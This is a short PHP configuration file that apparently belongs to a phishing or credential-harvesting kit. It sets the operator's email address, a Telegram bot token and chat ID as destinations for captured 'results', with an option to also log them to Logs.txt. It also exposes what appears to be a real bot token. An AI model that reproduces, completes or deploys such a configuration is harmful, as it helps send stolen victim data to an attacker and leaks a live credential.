<?php
    $receiver = "mytestervs@hotmail.com"; /* REPLACE STRING WITH EMAIL */
    $botToken = "6195248697:AAGkc8BXKOrJQZ2VN6sWT_S1DZW2YdrrPr0"; /* bot token */
    $ChatID = "5974720565"; /* your chat ID */
    $ReadFile = "off"; /* Change to on if you want results in Logs.txt file */
?>